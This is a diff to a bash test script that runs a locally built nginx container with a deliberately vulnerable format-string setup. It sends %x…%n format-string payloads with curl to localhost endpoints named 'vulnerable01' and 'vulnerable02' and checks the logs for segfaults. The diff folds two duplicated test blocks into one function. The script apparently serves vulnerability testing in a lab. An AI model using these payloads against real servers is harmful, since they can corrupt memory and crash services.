@@ -53,6 +53,46 @@ cleanup_container() {
     docker rm nginx-test
 }
 
+# Function to test an endpoint
+test_endpoint() {
+    local endpoint=$1
+    echo -e "\n${YELLOW}=== Testing endpoint: $endpoint ===${NC}"
+    echo -e "${YELLOW}Sending payload: $PAYLOAD${NC}"
+
+    # Send request and capture response with verbose output
+    echo -e "${YELLOW}=== Sending request with verbose output ===${NC}"
+    curl -v -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$PAYLOAD" 2>&1
+
+    # Send request again to capture response
+    RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080/$endpoint$PAYLOAD")
+    HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
+    BODY=$(echo "$RESPONSE" | sed '$d')
+
+    echo -e "\n${YELLOW}=== Response Details ===${NC}"
+    echo -e "Response code: ${HTTP_CODE}"
+    echo -e "Response body:"
+    echo "$BODY"
+
+    # Check container logs
+    echo -e "\n${YELLOW}=== Container Logs ===${NC}"
+    CONTAINER_LOGS=$(docker logs nginx-test)
+    echo "$CONTAINER_LOGS"
+    check_signal_11 "$CONTAINER_LOGS"
+
+    # Check error logs inside container
+    echo -e "\n${YELLOW}=== Nginx Error Logs ===${NC}"
+    ERROR_LOGS=$(docker exec nginx-test cat /usr/local/nginx/logs/error.log)
+    echo "$ERROR_LOGS"
+    check_signal_11 "$ERROR_LOGS"
+
+    # Check access logs inside container
+    echo -e "\n${YELLOW}=== Nginx Access Logs ===${NC}"
+    docker exec nginx-test cat /usr/local/nginx/logs/access.log
+
+    # Clean logs for next test
+    clean_logs
+}
+
 echo -e "${YELLOW}=== Building Docker image ===${NC}"
 docker build -t nginx-format-string .
 
@@ -63,94 +103,15 @@ fi
 
 echo -e "${GREEN}Docker image built successfully${NC}"
 
-# Start container for first test
+# Start container for test
 start_container
 
-# Test payloads
-URI_PAYLOAD="/%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"
-QUERY_PAYLOAD="/search?q=%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n&redirect=true"
+# Test payload for format string vulnerability
+PAYLOAD="%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%n"
 
-# Test URI format string vulnerability
-echo -e "\n${YELLOW}=== Testing URI format string vulnerability ===${NC}"
-echo -e "${YELLOW}Sending payload: $URI_PAYLOAD${NC}"
-
-# Send request and capture response with verbose output
-echo -e "${YELLOW}=== Sending request with verbose output ===${NC}"
-curl -v -s -w "\n%{http_code}" "http://localhost:8080$URI_PAYLOAD" 2>&1
-
-# Send request again to capture response
-RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080$URI_PAYLOAD")
-HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-BODY=$(echo "$RESPONSE" | sed '$d')
-
-echo -e "\n${YELLOW}=== Response Details ===${NC}"
-echo -e "Response code: ${HTTP_CODE}"
-echo -e "Response body:"
-echo "$BODY"
-
-# Check container status
-echo -e "\n${YELLOW}=== Container Status ===${NC}"
-docker ps -a | grep nginx-test
-
-# Check container logs
-echo -e "\n${YELLOW}=== Container Logs ===${NC}"
-CONTAINER_LOGS=$(docker logs nginx-test)
-echo "$CONTAINER_LOGS"
-check_signal_11 "$CONTAINER_LOGS"
-
-# Check error logs inside container
-echo -e "\n${YELLOW}=== Nginx Error Logs ===${NC}"
-ERROR_LOGS=$(docker exec nginx-test cat /usr/local/nginx/logs/error.log)
-echo "$ERROR_LOGS"
-check_signal_11 "$ERROR_LOGS"
-
-# Check access logs inside container
-echo -e "\n${YELLOW}=== Nginx Access Logs ===${NC}"
-docker exec nginx-test cat /usr/local/nginx/logs/access.log
-
-# Cleanup after first test
-cleanup_container
-
-# Start fresh container for second test
-start_container
-
-# Test query string format string vulnerability
-echo -e "\n${YELLOW}=== Testing query string format string vulnerability ===${NC}"
-echo -e "${YELLOW}Sending payload: $QUERY_PAYLOAD${NC}"
-
-# Send request and capture response with verbose output
-echo -e "${YELLOW}=== Sending request with verbose output ===${NC}"
-curl -v -s -w "\n%{http_code}" "http://localhost:8080$QUERY_PAYLOAD" 2>&1
-
-# Send request again to capture response
-RESPONSE=$(curl -s -w "\n%{http_code}" "http://localhost:8080$QUERY_PAYLOAD")
-HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
-BODY=$(echo "$RESPONSE" | sed '$d')
-
-echo -e "\n${YELLOW}=== Response Details ===${NC}"
-echo -e "Response code: ${HTTP_CODE}"
-echo -e "Response body:"
-echo "$BODY"
-
-# Check container status
-echo -e "\n${YELLOW}=== Container Status ===${NC}"
-docker ps -a | grep nginx-test
-
-# Check container logs
-echo -e "\n${YELLOW}=== Container Logs ===${NC}"
-CONTAINER_LOGS=$(docker logs nginx-test)
-echo "$CONTAINER_LOGS"
-check_signal_11 "$CONTAINER_LOGS"
-
-# Check error logs inside container
-echo -e "\n${YELLOW}=== Nginx Error Logs ===${NC}"
-ERROR_LOGS=$(docker exec nginx-test cat /usr/local/nginx/logs/error.log)
-echo "$ERROR_LOGS"
-check_signal_11 "$ERROR_LOGS"
-
-# Check access logs inside container
-echo -e "\n${YELLOW}=== Nginx Access Logs ===${NC}"
-docker exec nginx-test cat /usr/local/nginx/logs/access.log
+# Test both vulnerable endpoints
+test_endpoint "vulnerable01"
+test_endpoint "vulnerable02"
 
 # Final cleanup
 cleanup_container
